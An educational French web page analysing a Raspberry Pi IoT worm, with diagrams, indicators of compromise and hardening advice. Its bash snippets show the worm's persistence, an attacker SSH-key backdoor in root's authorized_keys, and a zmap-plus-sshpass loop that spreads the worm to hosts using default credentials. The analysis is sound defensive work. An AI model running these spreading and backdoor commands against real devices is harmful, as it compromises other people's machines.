---
layout: default
title: "Raspberry.Hack"
description: "Analyse Pédagogique d'un Worm Raspberry Pi"
generated_at: "2026-03-14 14:31:40"
last_update: "2026-03-14"
---

<div class="breadcrumb">
  <a href="/">Accueil</a> / <span>Raspberry.Hack</span>
</div>

<div class="page-header">
  <h1>Raspberry.Hack</h1>
  <div class="page-actions">
    <a href="qcm/" class="btn btn-secondary">QCM</a>
    <a href="https://github.com/venantvr-security/Raspberry.Hack" class="btn btn-primary" target="_blank">GitHub</a>
  </div>
</div>

# Analyse Pédagogique d'un Worm IoT Ciblant Raspberry Pi

> **AVERTISSEMENT** : Ce dépôt documente un worm **réel capturé dans la nature**. L'analyse est fournie à des fins **strictement éducatives** pour aider les administrateurs à protéger leurs appareils.

## Introduction : Une Menace Réelle pour l'IoT

En 2017-2018, une vague de malwares a ciblé les Raspberry Pi exposés sur Internet. Ce projet documente l'analyse détaillée de l'un de ces worms, capturé sur un honeypot. Comprendre son fonctionnement permet de mieux protéger les millions d'appareils IoT vulnérables dans le monde.

### Pourquoi les Raspberry Pi sont-ils ciblés ?

Le Raspberry Pi est devenu extrêmement populaire pour les projets DIY, les serveurs domestiques et les applications industrielles. Malheureusement, beaucoup d'utilisateurs laissent leur appareil avec la configuration par défaut :

- **Port SSH (22) ouvert** sur Internet
- **Mot de passe par défaut** : `pi` / `raspberry`
- **Pas de pare-feu** configuré

Cette combinaison fait du Raspberry Pi une cible idéale pour les botnets et les cryptomineurs.

### Fiche d'identité du worm analysé

| Caractéristique | Détail |
|-----------------|--------|
| **Cible** | Raspberry Pi avec SSH exposé |
| **Credentials exploités** | `pi:raspberry` (défaut) |
| **Outils de propagation** | zmap (scan) + sshpass (connexion) |
| **Canal C2** | IRC Undernet, canal #biret |
| **Capacités** | Botnet, exécution de commandes à distance |


## Cycle de Vie du Worm : Les 4 Phases

Pour comprendre comment ce worm opère, nous allons détailler son cycle de vie complet. Chaque phase a un objectif précis, de l'installation initiale jusqu'à la propagation vers de nouvelles victimes.

Le diagramme ci-dessous illustre l'enchaînement des phases. Remarquez comment la **Phase 4 (Propagation)** boucle vers la **Phase 1 (Installation)** : c'est ce qui fait de ce malware un "worm" (ver), capable de se répliquer automatiquement.

<div class="mermaid">
flowchart TB
    subgraph P1["🔧 Phase 1: Installation & Persistance"]
        I1["📁 Copie dans /opt/"]
        I2["⚙️ Modification rc.local"]
        I3["🔄 Obtention droits root"]
        I4["☠️ Kill malwares concurrents"]
        I5["🔐 Change mot de passe"]
        I6["🔑 Ajoute clé SSH attaquant"]
    end

    subgraph P2["📡 Phase 2: Connexion au C2"]
        C1["🔌 Connect Undernet IRC"]
        C2["📢 Join #biret"]
        C3["⏳ Attente commandes"]
        C4["✅ Vérification signature RSA"]
        C5["⚡ Exécution commande"]
    end

    subgraph P3["📦 Phase 3: Installation outils"]
        PR1["📥 apt install zmap"]
        PR2["📥 apt install sshpass"]
    end

    subgraph P4["🌐 Phase 4: Propagation"]
        S1["🔍 Scan 100k IPs sur port 22"]
        S2["🔓 Tentative SSH pi:raspberry"]
        S3["📤 SCP du worm"]
        S4["🚀 Exécution sur nouvelle victime"]
    end

    P1 --> P2 --> P3 --> P4
    P4 -->|"🔄 Nouvelle victime infectée"| P1

    style P1 fill:#e74c3c,fill-opacity:0.15
    style P2 fill:#9b59b6,fill-opacity:0.15
    style P3 fill:#f39c12,fill-opacity:0.15
    style P4 fill:#3498db,fill-opacity:0.15
</div>

### Phase 1 : Installation et persistance

Dès son exécution, le worm s'assure de survivre aux redémarrages et d'éliminer la concurrence. Voici les actions effectuées :

```bash
# 1. Se copier dans un emplacement discret
cp $0 /opt/.hidden_worm

# 2. S'ajouter au démarrage automatique
echo "/opt/.hidden_worm &" >> /etc/rc.local

# 3. Éliminer les cryptomineurs et autres malwares concurrents
# (pour monopoliser les ressources)
killall -9 minerd kaiten ktx-*

# 4. Installer une backdoor SSH pour l'attaquant
echo "ssh-rsa AAAA...clé_attaquant..." >> /root/.ssh/authorized_keys
```

**Point clé** : Le worm tue les processus concurrents comme `minerd` (cryptomineur) pour s'assurer d'avoir toute la puissance de calcul disponible.


## Le Command & Control (C2) via IRC

Une fois installé, le worm doit pouvoir recevoir des ordres de son opérateur. Pour cela, il utilise le protocole IRC (Internet Relay Chat), un choix classique pour les botnets car il permet de contrôler des milliers de machines simultanément via un simple canal de discussion.

### Pourquoi IRC ?

- **Discret** : le trafic IRC se fond dans le trafic légitime
- **Scalable** : un message dans un canal atteint tous les bots connectés
- **Résilient** : de nombreux serveurs IRC publics disponibles

### Flux de communication

Le diagramme suivant montre comment une commande est transmise depuis l'attaquant jusqu'au worm. Notez l'utilisation d'une **signature RSA** : cela empêche d'autres personnes de prendre le contrôle du botnet, même si elles découvrent le canal IRC.

<div class="mermaid">
sequenceDiagram
    autonumber
    participant W as 🤖 Worm (Bot)
    participant IRC as 💬 Serveur IRC Undernet
    participant ATK as 👤 Opérateur du botnet

    Note over W: Au démarrage
    W->>IRC: NICK bot_abc123
    W->>IRC: JOIN #biret
    Note over W: En attente silencieuse...

    Note over ATK: Envoi d'une commande
    ATK->>IRC: PRIVMSG #biret :[signature_RSA][commande_base64]
    IRC->>W: Relaye le message

    rect rgb(231, 76, 60, 0.3)
        Note over W: Traitement sécurisé
        W->>W: 1. Vérifier signature RSA
        W->>W: 2. Décoder base64
        W->>W: 3. Exécuter la commande
    end

    W->>IRC: PRIVMSG #biret :[résultat_base64]
    IRC->>ATK: Résultat de la commande
</div>


## Mécanisme de Propagation

La force d'un worm réside dans sa capacité à se propager automatiquement. Ce malware utilise une approche simple mais efficace : scanner massivement Internet à la recherche de Raspberry Pi vulnérables.

### Les outils utilisés

Le worm installe deux outils pour se propager :

- **zmap** : scanner réseau ultra-rapide capable de scanner tout Internet en quelques heures
- **sshpass** : permet de fournir un mot de passe SSH en ligne de commande (normalement interdit pour des raisons de sécurité)

### Le code de propagation

Voici comment le worm recherche et infecte de nouvelles victimes :

```bash
# Étape 1 : Scanner 100 000 IPs aléatoires sur le port SSH (22)
zmap -p 22 -n 100000 -o /tmp/targets.txt

# Étape 2 : Pour chaque IP trouvée, tenter une connexion
for ip in $(cat /tmp/targets.txt); do
    # Teste si le mot de passe par défaut fonctionne
    sshpass -p "raspberry" ssh pi@$ip "echo OK" && {
        # Si ça marche, copier le worm
        sshpass -p "raspberry" scp /opt/.worm pi@$ip:/tmp/
        # Et l'exécuter
        sshpass -p "raspberry" ssh pi@$ip "/tmp/.worm &"
    }
done
```

**Statistique effrayante** : Avec 100 000 IPs scannées par cycle et un taux de succès de seulement 0.1%, le worm infecte potentiellement 100 nouvelles machines à chaque itération.


## Indicateurs de Compromission (IOCs)

Si vous administrez des Raspberry Pi, voici les signes qui doivent vous alerter. La présence de l'un de ces éléments indique une probable infection.

### Fichiers suspects

| Chemin | Description |
|--------|-------------|
| `/opt/.hidden_worm` | Binaire principal du worm |
| `/opt/.infected` | Marqueur d'infection (évite la réinfection) |
| `/tmp/.worm` | Copie temporaire pendant la propagation |

### Activité réseau anormale

| Indicateur | Détail |
|------------|--------|
| **Port 6667** | Connexions IRC sortantes (C2) |
| **Canal #biret** | Canal IRC de commande |
| **Scans port 22** | Trafic massif vers des IPs aléatoires |


## Comment Se Protéger

La bonne nouvelle, c'est que se protéger contre ce type de worm est relativement simple. Voici les mesures essentielles à appliquer **immédiatement** sur tout Raspberry Pi exposé à Internet.

### Actions immédiates

```bash
# 1. CHANGER LE MOT DE PASSE (le plus important !)
passwd pi

# 2. Désactiver l'authentification par mot de passe SSH
# (utiliser des clés SSH à la place)
sudo sed -i 's/PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config
sudo systemctl restart ssh

# 3. Installer fail2ban pour bloquer les attaques brute-force
sudo apt install fail2ban

# 4. Vérifier qu'aucune clé SSH suspecte n'a été ajoutée
cat ~/.ssh/authorized_keys
cat /root/.ssh/authorized_keys
```

### Mesures supplémentaires recommandées

- **Ne pas exposer SSH directement** : utilisez un VPN ou un bastion
- **Changer le port SSH** : bien que ce ne soit que de la "security through obscurity", cela réduit le bruit
- **Surveillez les connexions** : `netstat -tulpn` régulièrement


## Pour Aller Plus Loin

Cette analyse n'est qu'un aperçu. Pour approfondir vos connaissances sur les malwares IoT et la sécurité des systèmes embarqués :

- 🔗 [MITRE ATT&CK for IoT](https://attack.mitre.org/) - Framework d'analyse des tactiques et techniques
- 📚 [Raspberry Pi Security Guide](https://www.raspberrypi.org/documentation/configuration/security.md) - Documentation officielle
- 🔬 [VirusTotal](https://www.virustotal.com/) - Pour analyser des fichiers suspects


## Exploits et Vulnérabilités Connues

Les appareils IoT comme le Raspberry Pi sont fréquemment ciblés par des malwares. Voici quelques exemples notables :

| Malware/CVE | Type | Description | Impact |
|-------------|------|-------------|--------|
| **Linux.MulDrop.14** | Worm/Cryptominer | Premier malware spécifiquement ciblé sur Raspberry Pi, minant du Monero | Des milliers d'appareils infectés en 2017 |
| **Mirai** | Botnet | Exploite les credentials par défaut sur IoT pour créer des botnets DDoS massifs | Attaque DDoS de 1.2 Tbps contre Dyn en 2016 |
| **CVE-2021-41773** | Vulnérabilité | Path traversal dans Apache souvent installé sur RPi permettant RCE | Affecte les RPi servant de serveurs web |
| **CVE-2018-10933** | libssh | Bypass d'authentification permettant l'accès sans mot de passe | Critique pour les services utilisant libssh |
| **BrickerBot** | PDoS | Malware destructif qui "brique" définitivement les appareils IoT vulnérables | Des millions d'appareils détruits en 2017 |

Le botnet **Mirai** et ses variantes restent la menace la plus significative pour les appareils IoT. Son code source ayant été publié, de nombreuses variantes continuent d'émerger, exploitant les mêmes faiblesses fondamentales : credentials par défaut et services exposés.


## Approfondissement Théorique

### L'écosystème des botnets IoT

Les botnets IoT représentent une évolution majeure des menaces informatiques. Contrairement aux botnets traditionnels basés sur des PC, les botnets IoT exploitent des appareils moins surveillés mais extrêmement nombreux. Un Raspberry Pi compromis consomme peu de ressources par rapport à un PC, mais des millions d'appareils IoT peuvent générer une puissance de frappe considérable. Le modèle économique est simple : les opérateurs de botnets louent leur capacité DDoS sur des forums criminels, ou l'utilisent pour du cryptomining. Le coût d'opération est minimal car l'électricité est payée par les victimes.

### Les techniques de persistance sur systèmes embarqués

La persistance sur Linux embarqué présente des particularités. Contrairement aux systèmes desktop, les appareils IoT sont rarement éteints mais souvent redémarrés lors de mises à jour ou coupures de courant. Les malwares exploitent donc plusieurs mécanismes : modification de `/etc/rc.local`, ajout de services systemd, cron jobs, ou modification directe des scripts de démarrage dans `/etc/init.d/`. Certains malwares plus sophistiqués modifient le firmware ou la partition de boot, survivant même à une réinstallation du système d'exploitation. Le worm analysé dans ce projet utilise une approche simple mais efficace combinant rc.local et clés SSH.

### Défense en profondeur pour IoT

La sécurisation des appareils IoT nécessite une approche multicouche. Au niveau réseau, la segmentation VLAN isole les appareils IoT du reste du réseau, limitant la propagation latérale. Les firewalls peuvent bloquer les connexions sortantes non autorisées (comme IRC sur le port 6667). Au niveau système, les mises à jour automatiques, la désactivation des services inutiles, et l'utilisation de comptes non privilégiés réduisent la surface d'attaque. Pour les déploiements critiques, des solutions comme **SELinux** ou **AppArmor** peuvent confiner les applications dans des sandboxes strictes, limitant les dégâts même en cas de compromission.


---

